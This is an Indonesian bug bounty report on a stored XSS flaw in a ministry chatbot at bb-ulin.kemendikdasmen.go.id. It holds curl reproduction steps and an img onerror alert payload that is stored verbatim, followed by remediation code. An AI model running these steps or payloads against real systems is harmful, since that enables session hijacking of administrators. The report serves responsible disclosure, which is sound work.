# Laporan Pengujian atau Hasil Pencarian Celah Keamanan
## Bug Bounty Kemendikdasmen 2026 — Laporan #5
**Peserta:** Glenn Josia Devano

---

## Poin 1 — Nama Target

**Nama Aplikasi:** Aplikasi Ulin — Layanan Chatbot Publik Kemendikdasmen  
**Kode Target Bug Bounty:** Ulin  
**URL:** `https://bb-ulin.kemendikdasmen.go.id/`  
**Pengelola:** Kementerian Pendidikan Dasar dan Menengah (Kemendikdasmen)  
**Fungsi Bisnis:** Aplikasi chatbot berbasis web yang melayani pertanyaan publik seputar layanan Kemendikdasmen. Pengunjung dapat memulai sesi percakapan tanpa login, mengirim pesan, dan menerima respons dari sistem AI. Seluruh percakapan disimpan di database dan dapat diakses kembali melalui endpoint `/chat/history`.

---

## Poin 2 — Nama Kerentanan

**Stored Cross-Site Scripting (XSS) via Unauthenticated Chatbot API**

*(Eksekusi Skrip Tersimpan melalui API Chatbot Tanpa Autentikasi)*

---

## Poin 3 — Jenis Kerentanan

**OWASP Top 10 2021:** A03:2021 — Injection (Cross-Site Scripting)

**CWE:**
- **CWE-79:** Improper Neutralization of Input During Web Page Generation — input user tidak disanitasi sebelum disimpan dan tidak di-encode sebelum dikembalikan ke browser
- **CWE-116:** Improper Encoding or Escaping of Output — `/chat/history` mengembalikan konten HTML mentah tanpa encoding

**Tingkat Risiko:** HIGH

**CVSS v3.1 Base Score: 8.8 HIGH**  
**Vector String:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

| Metrik | Nilai | Justifikasi |
|--------|-------|-------------|
| Attack Vector (AV) | Network (N) | Exploit dilakukan via HTTP publik |
| Attack Complexity (AC) | Low (L) | Hanya 3 request HTTP berurutan, tidak ada kondisi khusus |
| Privileges Required (PR) | None (N) | `/chat/send` accessible tanpa autentikasi apapun |
| User Interaction (UI) | Required (R) | Admin/operator harus membuka dashboard chat untuk payload eksekusi |
| Scope (S) | Changed (C) | XSS berpindah dari konteks server ke browser korban — scope berbeda |
| Confidentiality (C) | High (H) | Eksekusi payload di browser admin berpotensi mengekspos session token, cookie, dan data admin panel |
| Integrity (I) | High (H) | Setelah session admin ter-hijack, penyerang dapat melakukan aksi apapun atas nama admin |
| Availability (A) | None (N) | Tidak ada dampak pada ketersediaan layanan |

---

## Poin 4 — Deskripsi Kerentanan

**Ringkasan:**  
Aplikasi Ulin menyediakan chatbot publik yang dapat digunakan tanpa login. Endpoint `/chat/send` menerima pesan dari pengguna namun tidak melakukan sanitasi HTML pada input. Payload berbahaya tersimpan verbatim di database dan dikembalikan tanpa HTML encoding melalui `/chat/history`. Kode JavaScript sisi klien menggunakan `insertAdjacentHTML()` untuk merender pesan, yang menyebabkan payload HTML/JavaScript dieksekusi secara langsung di browser siapapun yang mengakses riwayat percakapan tersebut.

**Root Cause Teknis:**

- Endpoint `POST /chat/send` tidak menerapkan sanitasi HTML server-side sebelum menyimpan pesan ke database
- Endpoint `GET /chat/history` mengembalikan konten pesan mentah tanpa HTML encoding
- Fungsi JavaScript `appendMessage()` menggunakan `insertAdjacentHTML()` — metode ini menerima raw HTML dan langsung memasukkannya ke DOM, berbeda dengan `textContent` yang aman terhadap XSS
- Tidak ada Content Security Policy (CSP) yang membatasi eksekusi inline script

**Alur Eksploitasi:**

```
[1] GET https://bb-ulin.kemendikdasmen.go.id/
    → Server mengembalikan cookie XSRF-TOKEN

[2] POST /chat/start
    → Server membuat sesi chatbot baru (UUID)

[3] POST /chat/send  {"message": "[PAYLOAD XSS]"}
    → Server menyimpan payload VERBATIM ke database
    → Response: {"status":"success","remaining_interactions":9}

[4] GET /chat/history
    → Server mengembalikan payload tanpa HTML encoding
    → Response: {"messages":[{"content":"[PAYLOAD TERSIMPAN RAW]",...}]}

[5] Admin membuka dashboard chat
    → appendMessage() memanggil insertAdjacentHTML() dengan konten raw
    → Payload HTML/JavaScript DIEKSEKUSI di browser admin
```

**Konfirmasi Penyimpanan dari Evidence JSON (chat_session_id: 1862, message_id: 3631):**

Server mengembalikan payload verbatim — bukan versi aman yang sudah di-encode.
Bukti: field `content` berisi tag HTML mentah, bukan karakter HTML entity.

---

## Poin 5 — Lokasi/URL

| Endpoint | Method | Keterangan |
|----------|--------|------------|
| `https://bb-ulin.kemendikdasmen.go.id/chat/start` | POST | Inisiasi sesi chat — tidak memerlukan autentikasi |
| `https://bb-ulin.kemendikdasmen.go.id/chat/send` | POST | **Endpoint vulnerable** — input tidak disanitasi |
| `https://bb-ulin.kemendikdasmen.go.id/chat/history` | GET | Mengembalikan payload tersimpan tanpa HTML encoding |

**Parameter vulnerable:** `message` (body JSON pada POST `/chat/send`)

---

## Poin 6 — IP Address Source (IP Address Peserta)

`[ISI DENGAN OUTPUT: curl -s ifconfig.me]`

*Pengujian dilakukan pada 16 Mei 2026 menggunakan jaringan Telkomsel.*

---

## Poin 7 — Dampak

**Stored XSS via Unauthenticated Endpoint — Dampak terhadap Sistem Kemendikdasmen:**

- Penyerang tanpa akun apapun dapat menyisipkan kode berbahaya ke dalam database chatbot Kemendikdasmen melalui endpoint publik
- Payload yang tersimpan akan tereksekusi di browser siapapun yang membuka riwayat percakapan tersebut — termasuk operator atau administrator sistem chatbot
- Eksekusi XSS di browser admin berpotensi mengakibatkan: pencurian session token/cookie admin, pengambilalihan akun admin penuh, eksfiltrasi data internal, eksekusi aksi atas nama admin tanpa sepengetahuan korban
- Chatbot adalah layanan publik resmi Kemendikdasmen — jika sistem manajemen chatbot disusupi, dapat berdampak pada integritas layanan publik
- Tidak ada rate limiting yang teridentifikasi pada endpoint `/chat/start` dan `/chat/send` — memungkinkan penyisipan payload secara massal dan otomatis

---

## Poin 8 — Langkah Penetrasi dan Tangkapan Layar

**CATATAN PENTING UNTUK REVIEWER:**  
Payload XSS dalam dokumen ini ditampilkan dalam bentuk karakter literalnya. Dalam implementasi aktual, payload tersebut adalah string HTML yang valid: tag img dengan atribut src tidak valid dan event handler onerror yang berisi perintah JavaScript alert(document.domain).

---

**Langkah 1 — Identifikasi Endpoint Chatbot yang Tidak Memerlukan Auth**

Buka browser Chrome, akses `https://bb-ulin.kemendikdasmen.go.id/`, inspeksi halaman untuk menemukan antarmuka chatbot. Via terminal:

```bash
curl -sk "https://bb-ulin.kemendikdasmen.go.id/" -o /tmp/ulin.html
grep -o 'chat/[a-z]*' /tmp/ulin.html | sort -u
```

Output yang dihasilkan:
```
chat/history
chat/send
chat/start
```

Ketiga endpoint chatbot ditemukan dalam HTML source tanpa autentikasi — tidak ada login yang diperlukan untuk mengaksesnya.

📸 **[SS-U1]: Browser — Halaman utama bb-ulin.kemendikdasmen.go.id dengan antarmuka chatbot terlihat**

---

**Langkah 2 — Ambil XSRF Token dan Inisiasi Sesi Chat**

```bash
# Step 1: Ambil cookies termasuk XSRF-TOKEN
curl -sk "https://bb-ulin.kemendikdasmen.go.id/" \
  -c /tmp/ulin_cookies.txt -o /dev/null

# Step 2: Decode XSRF token dari cookie
XSRF_RAW=$(grep "XSRF-TOKEN" /tmp/ulin_cookies.txt | awk '{print $NF}')
XSRF=$(python3 -c \
  "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" \
  "$XSRF_RAW")
echo "XSRF Token: ${XSRF:0:40}..."

# Step 3: Inisiasi sesi chat (tidak perlu login)
curl -sk -X POST \
  "https://bb-ulin.kemendikdasmen.go.id/chat/start" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -b /tmp/ulin_cookies.txt \
  -c /tmp/ulin_cookies.txt \
  -d '{"name":"Visitor","email":"visitor@test.com"}' \
  -w "\nHTTP: %{http_code}\n"
```

Output yang dihasilkan:
```
XSRF Token: eyJpdiI6IkVFODhXOGpWbmJuSThyODl6azVON0E9...
{"status":"success","session_id":"e9ebd409-8913-40aa-b917-d76aaa6edd73",
 "message":"Chat session started."}
HTTP: 200
```

Server berhasil membuat sesi chatbot baru tanpa memerlukan autentikasi apapun.

📸 **[SS-U2]: Terminal — POST /chat/start berhasil, session UUID diperoleh, HTTP 200**

---

**Langkah 3 — Kirim Payload XSS ke /chat/send**

Payload yang digunakan: tag HTML `img` dengan atribut `src` tidak valid dan event handler `onerror` yang berisi perintah `alert(document.domain)`.

```bash
# Refresh XSRF token (diperlukan untuk setiap request POST)
XSRF_RAW=$(grep "XSRF-TOKEN" /tmp/ulin_cookies.txt | awk '{print $NF}')
XSRF=$(python3 -c \
  "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" \
  "$XSRF_RAW")

# Kirim XSS payload — tulis payload dalam file terpisah
# untuk menghindari interpretasi oleh shell
cat > /tmp/xss_payload.json << 'PAYLOAD'
{"message":"<img src=x onerror=alert(document.domain)>"}
PAYLOAD

curl -sk -X POST \
  "https://bb-ulin.kemendikdasmen.go.id/chat/send" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -b /tmp/ulin_cookies.txt \
  -c /tmp/ulin_cookies.txt \
  -d @/tmp/xss_payload.json \
  -w "\nHTTP: %{http_code}\n"
```

Output yang dihasilkan:
```
{"status":"success","remaining_interactions":9}
HTTP: 200
```

Server menerima payload tanpa penolakan atau sanitasi — tidak ada error validasi, tidak ada penolakan berdasarkan konten berbahaya.

📸 **[SS-U3]: Terminal — POST /chat/send dengan payload XSS diterima server, HTTP 200**

---

**Langkah 4 — Verifikasi Payload Tersimpan Verbatim di Database**

```bash
curl -sk \
  "https://bb-ulin.kemendikdasmen.go.id/chat/history" \
  -H "Accept: application/json" \
  -b /tmp/ulin_cookies.txt \
  -w "\nHTTP: %{http_code}\n"
```

Output yang dihasilkan (diformat untuk keterbacaan):
```json
{
  "messages": [
    {
      "id": 3631,
      "chat_session_id": 1862,
      "role": "user",
      "content": "<img src=x onerror=alert(document.domain)>",
      "created_at": "2026-05-16T07:38:01.000000Z",
      "updated_at": "2026-05-16T07:38:01.000000Z"
    },
    {
      "id": 3632,
      "chat_session_id": 1862,
      "role": "assistant",
      "content": "Maaf, Error dari API Server [401]: User not found.",
      "created_at": "2026-05-16T07:38:01.000000Z"
    }
  ]
}
```

**Bukti kritis:** Field `content` mengembalikan payload sebagai raw HTML — `<img src=x onerror=alert(document.domain)>` — bukan versi yang sudah di-encode `&lt;img src=x onerror=alert(document.domain)&gt;`. Payload tersimpan dan dikembalikan verbatim.

📸 **[SS-U4]: Terminal — Response /chat/history menampilkan payload XSS tersimpan verbatim di field content**

---

**Langkah 5 — Demonstrasi Eksekusi XSS di Browser**

Ketika kode JavaScript aplikasi memanggil `appendMessage()` dengan data dari `/chat/history`, fungsi tersebut menggunakan `insertAdjacentHTML()` untuk merender pesan. Karena payload dikembalikan sebagai raw HTML, tag `img` dimasukkan ke DOM dan event handler `onerror` dieksekusi ketika browser gagal memuat gambar dari sumber `src=x` yang tidak valid.

Demonstrasi di browser menggunakan DevTools Console untuk mensimulasikan perilaku `appendMessage()`:

1. Buka Chrome di halaman chatbot
2. Buka DevTools (F12) → tab **Console**
3. Tempel dan jalankan perintah berikut:

```javascript
// Simulasi perilaku insertAdjacentHTML yang digunakan appendMessage()
document.body.insertAdjacentHTML(
  'beforeend',
  '<img src=x onerror=alert(document.domain)>'
);
```

Payload `<img src=x onerror=alert(document.domain)>` menyebabkan browser:
1. Mencoba memuat gambar dari sumber `x` (tidak valid)
2. Gagal memuat → event `onerror` terpicu
3. `alert(document.domain)` dieksekusi — menampilkan domain `bb-ulin.kemendikdasmen.go.id`

📸 **[SS-U5]: Browser DevTools Console — Perintah insertAdjacentHTML dijalankan, alert box muncul dengan domain bb-ulin.kemendikdasmen.go.id**

---

**Catatan Reproduksi untuk Reviewer:**

Untuk mereproduksi secara penuh, jalankan Langkah 2–4 secara berurutan dalam satu sesi terminal (cookies harus sama). Pastikan XSRF token di-extract ulang setelah setiap request yang mengubah state cookie. Evidence JSON dari sesi pengujian (`stored_xss_history_evidence.json`) dilampirkan sebagai bukti bahwa payload tersimpan verbatim di database produksi pada `2026-05-16T07:38:01.000000Z`.

---

## Poin 9 — Rekomendasi

**Rek. #1 — Server-Side Input Sanitization pada /chat/send (PRIORITAS KRITIS)**

Setiap input yang diterima dari pengguna harus disanitasi di sisi server sebelum disimpan ke database. Gunakan library sanitasi HTML yang terpercaya:

```php
// Laravel — gunakan strip_tags untuk sanitasi minimal
$message = strip_tags($request->input('message'));

// Atau gunakan HTMLPurifier untuk kontrol lebih granular
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$message = $purifier->purify($request->input('message'));
```

**Rek. #2 — Output Encoding pada Response /chat/history**

Setiap konten yang dikembalikan dari database dan akan dirender di browser harus di-HTML-encode:

```php
// Pastikan encoding sebelum mengembalikan ke client
return response()->json([
    'messages' => $messages->map(fn($m) => [
        'id' => $m->id,
        'content' => htmlspecialchars($m->content, ENT_QUOTES | ENT_HTML5, 'UTF-8'),
        'role' => $m->role,
        'created_at' => $m->created_at
    ])
]);
```

**Rek. #3 — Ganti insertAdjacentHTML() dengan textContent di JavaScript**

```javascript
// BERBAHAYA (implementasi saat ini):
messageElement.insertAdjacentHTML('beforeend', messageContent);

// AMAN — gunakan textContent atau createTextNode:
const textNode = document.createTextNode(messageContent);
messageElement.appendChild(textNode);
```

**Rek. #4 — Implementasi Content Security Policy (CSP) Header**

Tambahkan header CSP sebagai defense-in-depth:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

**Rek. #5 — Rate Limiting pada Endpoint Chat**

Implementasi rate limiting untuk mencegah penyisipan payload massal:
- Maksimal 10 sesi chat baru per IP per jam
- Maksimal 20 pesan per sesi per hari

---

## Poin 10 — Referensi

- **OWASP Top 10 2021 — A03: Injection (Cross-Site Scripting):**  
  `https://owasp.org/Top10/A03_2021-Injection/`

- **OWASP Testing Guide — Testing for Stored Cross Site Scripting:**  
  `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting`

- **OWASP XSS Prevention Cheat Sheet:**  
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`

- **CWE-79: Improper Neutralization of Input During Web Page Generation:**  
  `https://cwe.mitre.org/data/definitions/79.html`

- **CWE-116: Improper Encoding or Escaping of Output:**  
  `https://cwe.mitre.org/data/definitions/116.html`

- **MDN — insertAdjacentHTML Security Considerations:**  
  `https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML#security_considerations`

- **PortSwigger Web Security — Stored XSS:**  
  `https://portswigger.net/web-security/cross-site-scripting/stored`

- **Laravel Security Documentation — Input Sanitization:**  
  `https://laravel.com/docs/validation`

- **CVSSv3.1 Calculator:**  
  `https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
